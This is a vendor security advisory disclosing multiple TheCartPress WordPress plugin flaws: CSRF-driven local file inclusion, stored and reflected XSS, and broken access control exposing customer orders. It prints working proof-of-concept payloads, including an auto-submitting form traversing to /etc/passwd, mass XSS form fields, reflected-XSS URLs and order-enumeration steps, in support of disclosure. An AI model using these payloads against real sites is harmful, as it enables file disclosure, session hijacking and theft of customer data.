@@ -1,0 +1,143 @@
+Advisory ID: HTB23254
+Product: TheCartPress WordPress plugin
+Vendor: TheCartPress team
+Vulnerable Version(s): 1.3.9 and probably prior
+Tested Version: 1.3.9
+Advisory Publication:  April 8, 2015  [without technical details]
+Vendor Notification: April 8, 2015 
+Public Disclosure: April 29, 2015 
+Vulnerability Type: Cross-Site Scripting [CWE-79], PHP File Inclusion [CWE-98], Cross-Site Scripting [CWE-79], Improper Access Control [CWE-284]
+CVE References: CVE-2015-3301, CVE-2015-3300, CVE-2015-3302
+Risk Level: High 
+CVSSv2 Base Scores: 7.6 (AV:N/AC:H/Au:N/C:C/I:C/A:C), 5 (AV:N/AC:L/Au:N/C:N/I:P/A:N), 5 (AV:N/AC:L/Au:N/C:N/I:P/A:N), 4.3 (AV:N/AC:M/Au:N/C:N/I:P/A:N)
+Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ ) 
+
+-----------------------------------------------------------------------------------------------
+
+Advisory Details:
+
+High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in TheCartPress WordPress plugin, which can be exploited to execute arbitrary PHP code, disclose sensitive data, and perform Cross-Site Scripting attacks against users of WordPress installations with the vulnerable plugin.
+
+1) Local PHP File Inclusion in TheCartPress WordPress plugin: CVE-2015-3301
+
+Input passed via the "tcp_box_path" HTTP POST parameter passed to "/wp-admin/admin.php?page=checkout_editor_settings" URL is not properly verified before being used in PHP 'include()' function, and can be abused to include arbitrary local files via directory traversal sequences.
+
+In order to successfully exploit the vulnerability an attacker needs to have administrator privileges on WordPress installation, however this can be also exploited via CSRF vector to which the script is vulnerable as well. 
+
+Simple CSRF exploit below will execute the content of '/etc/passwd' file when a logged-in administrator will visit a page with it:
+
+<form action="http://wordpress/wp-admin/admin.php?page=checkout_editor_settings" method="post" name="main">
+<input type="hidden" name="tcp_save_fields"  value='1'>
+<input type="hidden" name="tcp_box_path"  value='../../../../../etc/passwd'>
+<input type="submit" id="btn">
+</form>
+<script>
+ document.main.submit();
+</script>
+
+
+
+2) Stored XSS in TheCartPress WordPress plugin: CVE-2015-3300
+
+During the checkout process, many user-supplied HTTP POST parameters (see complete list in PoC)in "Shipping address" and "Billing address" sections are not being sanitized before being stored in the local database. 
+
+Simple mass-XSS PoC against "Billing address" section (PoC against "Shipping address" scetion is identical, just replace 'billing_' prefix with 'shipping_') will write several JS pop-up alerts into the application database:
+
+<form action="http://wordpress/shopping-cart/checkout/" method="post" name="main">
+<input type="hidden" name="selected_billing_id"  value='1'>
+<input type="hidden" name="selected_billing_address"  value='new'>
+<input type="hidden" name="billing_firstname"  value='"><script>alert(/immuniweb/);</script>'>
+<input type="hidden" name="billing_lastname"  value='"><script>alert(/immuniweb/);</script>'>
+<input type="hidden" name="billing_company"  value='"><script>alert(/immuniweb/);</script>'>
+<input type="hidden" name="billing_tax_id_number"  value='"><script>alert(/immuniweb/);</script>'>
+<input type="hidden" name="billing_country_id"  value='AF'>
+<input type="hidden" name="billing_region_id"  value=''>
+<input type="hidden" name="billing_region"  value=''>
+<input type="hidden" name="billing_city"  value='"><script>alert(/immuniweb/);</script>'>
+<input type="hidden" name="billing_street"  value='"><script>alert(/immuniweb/);</script>'>
+<input type="hidden" name="billing_street_2"  value='"><script>alert(/immuniweb/);</script>'>
+<input type="hidden" name="billing_postcode"  value='"><script>alert(/immuniweb/);</script>'>
+<input type="hidden" name="billing_telephone_1"  value='"><script>alert(/immuniweb/);</script>'>
+<input type="hidden" name="billing_telephone_2"  value='"><script>alert(/immuniweb/);</script>'>
+<input type="hidden" name="billing_fax"  value='"><script>alert(/immuniweb/);</script>'>
+<input type="hidden" name="billing_email"  value='mail@mail.com'>
+<input type="hidden" name="tcp_continue"  value=''>
+<input type="hidden" name="tcp_step"  value='1'>
+<input type="submit" id="btn">
+</form>
+
+
+A non-authenticated attacker may inject malicious HTML and JS code that will be stored in the application database, and available to any non-authenticated user on the following URL:
+
+http://wordpress/wp-admin/admin-ajax.php?order_id=[order_id]&action=tcp_print_order
+
+As well as on the following URL accessible to WordPress administrator only:
+
+http://wordpress/wp-admin/admin.php?page=thecartpress/admin/OrdersListTable.php
+
+
+3) Improper Access Control in TheCartPress WordPress plugin: CVE-2015-3302
+
+Any non-authenticated user may browse orders of other users due to broken authentication mechanism. To reproduce the vulnerability an attacker shall first open the following URL:
+http://wordpress/shopping-cart/checkout/?tcp_checkout=ok&order_id=[order_id]
+
+And just after open the following URL to see full order details:
+http://wordpress/wp-admin/admin-ajax.php?order_id=[order_id]&action=tcp_print_order
+
+Moreover, the order ID can be easily predicted, as every new order ID is an incremented value of the previous one. This enables non-authenticated remote attacker to steal all currently-existing orders.
+
+
+4) Multiple XSS in TheCartPress WordPress plugin (against administrator only): CVE-2015-3300
+
+4.1 Input passed via the "search_by" GET parameter to "/wp-admin/admin.php?page=thecartpress/admin/AddressesList.php" is not properly sanitised before being returned to the user. A remote attacker can trick logged-in administrator to open a specially crafted link and execute arbitrary HTML and script code in browser in context of the vulnerable website.
+
+http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AddressesList.php&search_by=--%3E%%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E
+
+4.2 Input passed via the "address_id", "address_name", "firstname", "lastname", "street", "city", "postcode", "email" GET parameters to "/wp-admin/admin.php?page=thecartpress/admin/AddressEdit.php" is not properly sanitised before being returned to the user. A remote attacker can trick logged-in administrator to open a specially crafted link and execute arbitrary HTML and script code in browser in context of the vulnerable website.
+
+http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AddressEdit.php&address_id=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E
+http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AddressEdit.php&address_name=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E
+http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AddressEdit.php&firstname=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E
+http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AddressEdit.php&lastname=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E
+http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AddressEdit.php&street=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E
+http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AddressEdit.php&city=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E
+http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AddressEdit.php&postcode=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E
+http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AddressEdit.php&email=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E
+
+4.3 Input passed via the "post_id" and "rel_type" GET parameters to "/wp-admin/admin.php?page=thecartpress/admin/AssignedCategoriesList.php" is not properly sanitised before being returned to the user. A remote attacker can trick logged-in administrator to open a specially crafted link and execute arbitrary HTML and script code in browser in context of the vulnerable website.
+
+http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AssignedCategoriesList.php&post_id=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E
+http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AssignedCategoriesList.php&post_id=1&rel_type=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E
+
+4.4 Input passed via the "post_type" GET parameter to "/wp-admin/admin.php?page=thecartpress/admin/CustomFieldsList.php" is not properly sanitised before being returned to the user. A remote attacker can trick logged-in administrator to open a specially crafted link and execute arbitrary HTML and script code in browser in context of the vulnerable website.
+
+http://wordpress/wp-admin/admin.php?page=thecartpress/admin/CustomFieldsList.php&post_type=1--%3E%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E
+
+-----------------------------------------------------------------------------------------------
+
+Solution:
+
+2015-04-08 Vendor Alerted via emails.
+2015-04-17 Vendor Alerted via contact form and emails.
+2015-04-17 Vendor Alerted via WordPress Support Forums.
+2015-04-27 Fix Requested via emails.
+2015-04-29 Public disclosure.
+
+Currently we are not aware of any official solution for this vulnerability.
+According to the vendor the plugin will not be supported anymore since 1st of June 2015: http://thecartpress.com/extend/important-note-nota-importante/
+
+We recommend disabling or removing the vulnerable plugin as a workaround.
+
+-----------------------------------------------------------------------------------------------
+
+References:
+
+[1] High-Tech Bridge Advisory HTB23254 - https://www.htbridge.com/advisory/HTB23254 - Multiple vulnerabilities in TheCartPress Wordpress plugin.
+[2] TheCartPress Wordpress plugin- http://thecartpress.com/ - Professional WordPress eCommerce Plugin. Use it as Shopping Cart, Catalog or Framework.
+[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures.
+[4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.
+[5] ImmuniWeb® SaaS - https://www.htbridge.com/immuniweb/ - hybrid of manual web application penetration test and cutting-edge vulnerability scanner available online via a Software-as-a-Service (SaaS) model.
+
+-----------------------------------------------------------------------------------------------
+
+Disclaimer: The information provided in this Advisory is provided "as is" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.
